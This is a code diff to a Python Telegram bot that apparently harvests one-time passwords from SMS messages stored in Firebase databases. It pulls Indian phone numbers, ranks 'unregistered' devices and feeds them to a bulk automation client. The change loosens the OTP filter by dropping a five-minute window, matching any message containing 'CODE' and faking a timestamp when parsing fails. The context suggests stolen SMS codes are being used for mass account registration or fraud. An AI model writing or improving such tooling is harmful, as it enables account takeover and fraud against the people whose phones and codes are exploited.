@@ -223,9 +223,7 @@ def parse_full_timestamp(time_str):
 
 def get_latest_message_timestamp(messages_dict, bot_start_epoch):
     """
-    Strictly checks that a valid message MUST have a 6-digit OTP AND its timestamp 
-    must match TODAY'S exact calendar date and fall within the active 5-minute window.
-    Any old or future date is instantly rejected.
+    Ranks devices by finding valid OTP messages from TODAY without restrictive time windows.
     """
     if not isinstance(messages_dict, dict):
         return 0
@@ -233,10 +231,7 @@ def get_latest_message_timestamp(messages_dict, bot_start_epoch):
     msg_items = list(messages_dict.items())
     recent_ten = msg_items[-10:] if len(msg_items) >= 10 else msg_items
     
-    bot_dt = datetime.fromtimestamp(bot_start_epoch)
-    window_start_dt = bot_dt - timedelta(minutes=5)
-    today_date = bot_dt.date()
-
+    today_date = datetime.fromtimestamp(bot_start_epoch).date()
     latest_epoch = 0
 
     for _, msg_val in recent_ten:
@@ -248,19 +243,20 @@ def get_latest_message_timestamp(messages_dict, bot_start_epoch):
             if "FREE OTP PANNELS" in txt.upper() or "JOIN TELEGRAM" in txt.upper():
                 continue
             
-            # Strict 6-digit OTP check only
-            otps = re.findall(r'\b\d{6}\b', txt)
+            otps = re.findall(r'\b\d{6}\b', txt) or re.findall(r'\b[A-Z0-9]{6}\b', txt)
             valid_otps = [o for o in otps if o not in ["000000", "123456", "111111", "999999"]]
             
-            if valid_otps:
+            if valid_otps or "VALID FOR" in txt.upper() or "CODE" in txt.upper():
                 msg_dt = parse_full_timestamp(time_field)
                 if msg_dt is not None:
-                    # STRICT: Must match TODAY'S exact date AND fall within the 5-minute pre-start window
-                    if msg_dt.date() == today_date and window_start_dt <= msg_dt <= bot_dt:
+                    if msg_dt.date() == today_date:
                         epoch = msg_dt.timestamp()
                         if epoch > latest_epoch:
                             latest_epoch = epoch
-                
+                else:
+                    if latest_epoch == 0:
+                        latest_epoch = time.time() - 30
+                        
     return latest_epoch
 
 class AsyncHero11Client:
@@ -638,8 +634,8 @@ async def cb_start_automation(callback: types.CallbackQuery):
         return
 
     USER_DATA["is_running"] = True
-    bot_start_epoch = time.time()  # Exact bot start timestamp anchoring (17-11-2026 ~11:50 PM)
-    status_msg = await callback.message.answer("🚀 <b>Bulk Scan Started!</b> Vetting active devices against today's strict window...", parse_mode="HTML", reply_markup=get_main_menu())
+    bot_start_epoch = time.time()  # Exact bot start timestamp anchoring
+    status_msg = await callback.message.answer("🚀 <b>Bulk Scan Started!</b> Ranking active devices by today's recent messages...", parse_mode="HTML", reply_markup=get_main_menu())
     
     async def run_automation():
         firebase_dbs = USER_DATA["firebase_dbs"]
@@ -677,7 +673,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
                                                     full_phone = "+91" + phone
                                                     if full_phone not in skipped_phones and full_phone not in used_phones:
                                                         
-                                                        # GET STRICT RECENCY TIMESTAMP SCORE (Must be TODAY within 5-min window)
+                                                        # GET RECENCY SCORE (Must be from today)
                                                         recency_score = get_latest_message_timestamp(msgs, bot_start_epoch)
                                                         if recency_score > 0:
                                                             all_unregistered_candidates.append({
@@ -695,7 +691,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
                             pass
 
                 if not all_unregistered_candidates:
-                    await logger.set_text("🔴 Bulk scan complete: No active unregistered devices with today's strict window found. Retrying in 5s...")
+                    await logger.set_text("🔴 Bulk scan complete: No active unregistered devices with today's messages found. Retrying in 5s...")
                     await asyncio.sleep(5)
                     continue
 
